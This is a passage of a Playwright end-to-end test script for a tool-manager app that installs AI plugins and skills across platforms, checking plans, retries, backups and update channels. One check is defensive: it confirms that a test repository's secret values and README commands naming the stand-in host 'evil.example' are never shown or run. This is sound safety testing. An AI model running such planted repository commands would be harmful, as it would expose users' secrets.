      CLAUDE_ADDS_PICK_DIR: backups,
      CLAUDE_ADDS_UPDATE_API: `http://127.0.0.1:${server.address().port}/releases`,
    });

    await page.locator('#add-tool').click();
    await page.fill('#plan-url', 'http://example.test/repo');
    await page.locator('[data-plan-inspect]').click();
    check(T, 'a non-https link is refused before anything is downloaded', (await page.locator('[data-plan-error]').innerText()).includes('https'));
    await page.fill('#plan-url', repo);
    await page.locator('[data-plan-inspect]').click();
    await page.waitForSelector('#plan .plan-item', { timeout: 120000 });
    const items = await page.locator('#plan .plan-item').evaluateAll((list) => list.map((i) => i.dataset.item));
    check(T, 'repository contents are classified by type', ['plugin:demo-plugin', 'plugin:sleepy-plugin', 'extension:demo-extension', 'connector:demo-server', 'skill:skills/demo-skill', 'skill:skills/broken'].every((id) => items.includes(id)), items.join(' '));
    const planText = await page.locator('#plan').innerText();
    check(T, 'secrets and README commands from the repository are neither shown nor run', !planText.includes('do-not-show-this') && !planText.includes('evil.example'));

    const skill = page.locator('#plan .plan-item[data-item="skill:skills/demo-skill"]');
    const skillDests = await skill.locator('.dest').evaluateAll((list) => Object.fromEntries(list.map((d) => [d.dataset.dest, d.dataset.destState])));
    check(T, 'one skill offers every compatible destination in one plan', skillDests['claude-code'] === 'ready' && skillDests.codex === 'ready' && skillDests.gemini === 'ready' && skillDests.antigravity === 'ready' && skillDests.claude === 'needs-completion' && skillDests.chatgpt === 'unsupported', JSON.stringify(skillDests));
    check(T, 'each destination states its compatibility evidence', (await skill.locator('.dest[data-dest="codex"]').innerText()).includes('.agents/skills'));
    check(T, 'a skill without valid metadata is not offered anywhere', await page.locator('#plan .plan-item[data-item="skill:skills/broken"] .dest').evaluateAll((list) => list.every((d) => d.dataset.destState === 'unsupported')));
    check(T, 'a destination with no direct mechanism shows "complete setup" with the official command', (await text(page.locator('#plan .plan-item[data-item="extension:demo-extension"] .dest[data-dest="gemini"]'))).includes('إكمال الإعداد') && (await page.locator('#plan .plan-item[data-item="connector:demo-server"] .dest[data-dest="codex"] code').innerText()).startsWith('codex mcp add'));
    check(T, 'nothing is ticked by default in a multi-item plan', await page.locator('#plan [data-plan-run]').isDisabled());

    for (const id of ['claude-code', 'codex', 'gemini', 'antigravity']) await skill.locator(`.dest[data-dest="${id}"] input`).check();
    await page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] .dest[data-dest="claude-code"] input').check();
    await page.locator('#plan .plan-item[data-item="plugin:sleepy-plugin"] .dest[data-dest="claude-code"] input').check();
    check(T, 'the run button counts the chosen destinations', (await page.locator('#plan [data-plan-run]').innerText()).includes('(6)'));
    await page.locator('#plan [data-plan-run]').click();
    await page.waitForSelector('#plan .plan-item[data-item="plugin:demo-plugin"] [data-progress="install"]', { timeout: 60000 });
    check(T, 'a running install shows its stage and a stage counter', (await text(page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] [data-progress]'))).includes('2 من 4') && (await text(page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] [data-progress]'))).includes('جاري التثبيت'));
    await page.screenshot({ path: join(shots, '10-install-progress.png') });
    await page.waitForSelector('#plan .plan-item[data-item="plugin:sleepy-plugin"] .plan-result', { timeout: 180000 });
    const outcome = await skill.locator('.plan-result').evaluateAll((list) => Object.fromEntries(list.map((r) => [r.dataset.resultEnv, r.dataset.result])));
    check(T, 'each destination reports its own result', outcome['claude-code'] === 'verified' && outcome.codex === 'verified' && outcome.antigravity === 'verified' && outcome.gemini === 'failed', JSON.stringify(outcome));
    check(T, 'the skill was copied to each documented folder', existsSync(join(home, '.claude', 'skills', 'demo-skill', 'SKILL.md')) && existsSync(join(home, '.agents', 'skills', 'demo-skill', 'reference.md')) && existsSync(join(home, '.gemini', 'config', 'skills', 'demo-skill', 'SKILL.md')));
    check(T, 'a plugin that arrives switched off is enabled, and success means verified as enabled', (await page.locator('#plan .plan-item[data-item="plugin:sleepy-plugin"] .plan-result').getAttribute('data-result')) === 'verified' && JSON.parse(readFileSync(fakeState, 'utf8')).plugins['sleepy-plugin'] === true);

    rmSync(join(home, '.gemini', 'skills'));
    await skill.locator('[data-retry]').click();
    await page.waitForSelector('#plan .plan-item[data-item="skill:skills/demo-skill"] .plan-result[data-result-env="gemini"][data-result="verified"]', { timeout: 60000 });
    check(T, 'the failed destination is retried on its own and succeeds', existsSync(join(home, '.gemini', 'skills', 'demo-skill', 'SKILL.md')));
    await page.screenshot({ path: join(shots, '11-git-results.png') });
    await page.locator('#plan [data-plan-close]').click();
    await idle(page);

    // One merged record for the identical skill in four platforms.
    await tab(page, 'skill').click();
    await page.fill('#search', 'demo-skill');
    check(T, 'identical copies in four platform folders appear as one tool in "my tools"', (await rows(page).evaluateAll((list) => list.filter((r) => r.dataset.mine === 'true').length)) === 1);
    await rows(page).first().locator('.name-btn').click();
    const placed = await page.locator('#details [data-placement]').evaluateAll((list) => list.map((p) => p.dataset.placement).sort());
    check(T, 'the merged tool shows its state in each platform', placed.join() === 'antigravity,claude-code,codex,gemini', placed.join());
    await page.locator('#details [data-primary="verify"]').click();
    await page.waitForSelector('#details [data-outcome]', { timeout: 120000 });
    check(T, '"check readiness" re-verifies a discovered tool and shows the evidence', (await page.locator('#details [data-outcome]').getAttribute('data-outcome')) === 'ok' && (await page.locator('#details [data-outcome] details').count()) === 1);

    // Auto-fix for a skill in an undocumented folder: scope shown, confirmed, then verified.
    await page.fill('#search', 'old-skill');
    await rows(page).first().locator('.name-btn').click();
    await page.locator('#details [data-primary="fix"]').click();
    await page.waitForSelector('#diag [data-diag-fix="copy-skill"]', { timeout: 60000 });
    check(T, 'diagnosis finds a skill in an undocumented folder', (await page.locator('#diag [data-diag]').getAttribute('data-diag-issue')) === 'skill-scope');
    await page.locator('#diag [data-diag-fix="copy-skill"]').click();
    check(T, 'a fix that changes something shows its action and scope and waits for confirmation', (await page.locator('#diag [data-diag-confirm]').innerText()).includes('.agents/skills') && !existsSync(join(home, '.agents', 'skills', 'old-skill')));
    await page.locator('#diag [data-diag-fix="copy-skill"]').click();
    await page.waitForSelector('#diag [data-diag-result]', { timeout: 120000 });
    check(T, 'after confirmation the fix runs and the tool is re-checked', (await page.locator('#diag [data-diag-result]').getAttribute('data-diag-result')) === 'ok' && existsSync(join(home, '.agents', 'skills', 'old-skill', 'SKILL.md')));
    await page.locator('#diag [data-diag-close]').click();

    // Connector sign-in is its own step: wait for auth, then verify.
    await page.fill('#search', '');
    await tab(page, 'connector').click();
    await page.locator('[data-tool="connector:needs-login"]').click();
    check(T, 'a connector that needs sign-in offers "continue authentication"', await page.locator('#details [data-primary="auth"]').isVisible());
    await page.locator('#details [data-primary="auth"]').click();
    await page.waitForSelector('#details [data-outcome]', { timeout: 120000 });
    check(T, 'after sign-in the connector is re-checked and reported as connected', (await page.locator('#details [data-outcome]').getAttribute('data-outcome')) === 'ok' && (await page.locator('#table-wrap tbody tr:has([data-tool="connector:needs-login"])').getAttribute('data-status')) === 'connected');

    // Direct install from the details, with the plan closed while it runs.
    await page.locator('[data-nav="catalog"]').click();
    await tab(page, 'plugin').click();
    await page.fill('#search', 'legal');
    await page.locator('[data-tool="plugin:legal"]').click();
    await page.locator('#details [data-primary="install"]').click();
    await page.waitForSelector('#plan .plan-item');
    await page.locator('#plan [data-plan-run]').click();
    await page.waitForSelector('#plan [data-progress]', { timeout: 60000 });
    await page.locator('#plan [data-plan-close]').click();
    check(T, 'the install keeps running after the plan is closed, and the details show its stage', (await page.locator('#plan').isHidden()) && (await page.locator('#details [data-action-zone] [data-progress]').count()) === 1, await text(page.locator('#details [data-action-zone]')));
    await page.screenshot({ path: join(shots, '12-background-install.png') });
    await page.locator('#panel-toggle').click();
    // The stand-in CLI records the install when it finishes; then the app re-inventories.
    const installedLegal = () => existsSync(fakeState) && Object.entries(JSON.parse(readFileSync(fakeState, 'utf8')).plugins ?? {}).some(([id, enabled]) => id.startsWith('legal') && enabled === true);
    await until(installedLegal);
    await page.waitForTimeout(3000);
    await idle(page);
    await page.locator('#panel-toggle').click();
    await page.locator('[data-nav="mine"]').click();
    await page.fill('#search', 'legal');
    const legalRow = page.locator('#table-wrap tbody tr:has([data-tool="plugin:legal"])');
    check(T, 'hiding the panel does not stop the install: the plugin ends up enabled in "my tools"', installedLegal() && (await legalRow.getAttribute('data-status')) === 'enabled' && (await legalRow.getAttribute('data-mine')) === 'true', `${await legalRow.getAttribute('data-status')} mine=${await legalRow.getAttribute('data-mine')}`);
    await page.locator('[data-tool="plugin:legal"]').click();
    check(T, 'reopening the details shows the outcome of the background install', (await page.locator('#details [data-outcome]').count()) === 1 && (await page.locator('#details [data-outcome]').getAttribute('data-outcome')) === 'ok', (await text(page.locator('#details [data-action-zone]'))).slice(0, 160));

    // Backup and app update.
    await page.fill('#search', '');
    await page.locator('[data-nav="platforms"]').click();
    await page.locator('[data-backup-choose]').click();
    await page.waitForFunction(() => !document.querySelector('[data-backup-run]')?.disabled);
    await page.locator('[data-backup-run]').click();
    await page.waitForSelector('[data-backup-result]', { timeout: 60000 });
    const folders = readdirSync(backups);
    const manifest = folders[0] && existsSync(join(backups, folders[0], 'manifest.json')) ? readFileSync(join(backups, folders[0], 'manifest.json'), 'utf8') : '';
    check(T, 'a dated backup holds the inventory and owned skills, with no credential values', (await page.locator('[data-backup-result]').getAttribute('data-backup-result')) === 'ok' && manifest.includes('demo-skill') && existsSync(join(backups, folders[0], 'skills', 'user-skills', 'demo-skill', 'SKILL.md')) && !manifest.includes('do-not-show-this'));
    await page.locator('[data-app-update-check]').click();
    await page.waitForSelector('[data-app-update="available"]', { timeout: 30000 });
    check(T, 'the sidebar reports an available app update on the stable channel', (await text(page.locator('[data-app-update]'))).includes('99.0.0') && (await page.locator('[data-app-version]').getAttribute('data-app-channel')) === 'stable');
    await page.selectOption('#update-channel', 'dev');
    await page.waitForFunction(() => document.querySelector('[data-app-update]')?.textContent?.includes('99.1.0-dev.3'), null, { timeout: 30000 });
    check(T, 'switching to the development channel follows the newest build and shows the channel', (await page.locator('[data-app-version]').getAttribute('data-app-channel')) === 'dev');
    server.close();
    check(T, 'no console errors', errors.length === 0, errors.join(' | '));
    await app.close();
  }

  // ---------- 6. Full journey with the real Claude CLI, isolated ----------
  if (wants('isolated')) {
    const T = 'REAL-ISOLATED';
    const home = join(sandbox, 'iso-home');
    const config = join(home, '.claude');
    mkdirSync(home, { recursive: true });
    const realRegistry = join(process.env.USERPROFILE ?? '', '.claude', 'plugins', 'installed_plugins.json');
    const realBefore = existsSync(realRegistry) ? readFileSync(realRegistry, 'utf8') : '';

    const { app, page, errors } = await launch(join(sandbox, 'iso-profile'), { CLAUDE_ADDS_HOME: home, CLAUDE_CONFIG_DIR: config, CLAUDE_ADDS_CLAUDE_BIN: undefined });
    await env(page, 'claude-code').click();
    check(T, 'isolated Claude Code starts with no plugins', (await rowCount(page)) === 0);
    await env(page, 'all').click();

    // Search by task, read what the tool does, then install it.
    await page.fill('#search', 'المهام');
    await page.locator('[data-tool="plugin:productivity"]').click();
    const details = await text(page.locator('#details'));
    check(T, 'searching by task finds the tool in the catalog and explains it', details.includes('إدارة المهام') && details.includes('من الكتالوج'));
    await page.locator('#details [data-primary="install"]').click();
    await page.waitForSelector('#plan .plan-item');
    const command = await page.locator('#plan .dest[data-dest="claude-code"] code').innerText();
    check(T, 'the plan uses the documented marketplace install for a fresh configuration', command === 'claude plugin install productivity --marketplace anthropics/knowledge-work-plugins --scope user', command);
    await page.locator('#plan [data-plan-run]').click();
    await page.waitForSelector('#plan .plan-result', { timeout: 300000 });
    check(T, 'the real Claude CLI installed the plugin in the background and a fresh inventory confirmed it as enabled', (await page.locator('#plan .plan-result').getAttribute('data-result')) === 'verified', (await text(page.locator('#plan .plan-result'))).slice(0, 110));
    await page.screenshot({ path: join(shots, '13-real-install-result.png') });
    await page.locator('#plan [data-plan-close]').click();
    await idle(page);

    await page.fill('#search', '');
    await page.locator('[data-nav="mine"]').click();
    await env(page, 'claude-code').click();
    const row = page.locator('#table-wrap tbody tr:has([data-tool="plugin:productivity"])');
    check(T, 'the plugin now appears in "my tools" as enabled', (await row.getAttribute('data-status')) === 'enabled' && (await row.getAttribute('data-mine')) === 'true');
    await page.locator('[data-tool="plugin:productivity"]').click();
    const placement = page.locator('#details [data-placement="claude-code"]');
    check(T, 'its status is enabled in user scope', (await placement.getAttribute('data-placement-status')) === 'enabled' && (await placement.innerText()).includes('المستخدم'));
    check(T, 'its skills and connectors arrive with it', (await page.locator('#details [data-related]').count()) > 3);
    await page.screenshot({ path: join(shots, '14-real-install-my-tools.png') });

    const listed = execFileSync('cmd.exe', ['/d', '/s', '/c', 'claude plugin list --json'], { env: { ...process.env, CLAUDE_CONFIG_DIR: config }, encoding: 'utf8' });
    check(T, 'claude plugin list confirms it outside the app', JSON.parse(listed).some((p) => p.id === 'productivity@knowledge-work-plugins' && p.enabled === true && p.scope === 'user'));
    check(T, 'the real Claude configuration was not changed', (existsSync(realRegistry) ? readFileSync(realRegistry, 'utf8') : '') === realBefore);
    check(T, 'no console errors', errors.length === 0, errors.join(' | '));
    await app.close();
  }

  for (const dir of [profile, emptyProfile, sandbox]) await rm(dir, { recursive: true, force: true }).catch(() => {});

  const failed = results.filter((r) => !r.pass);
  const byTag = Object.entries(Object.groupBy(results, (r) => r.tag)).map(([tag, list]) => `${tag} ${list.filter((r) => r.pass).length}/${list.length}`);
  console.log(`\n${results.length - failed.length}/${results.length} checks passed  (${byTag.join(', ')})`);
  if (failed.length > 0) process.exitCode = 1;
}

main()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  // A failed step must not leave an app window open behind it.
  .finally(() => Promise.all(openApps.map((app) => app.close().catch(() => {}))));
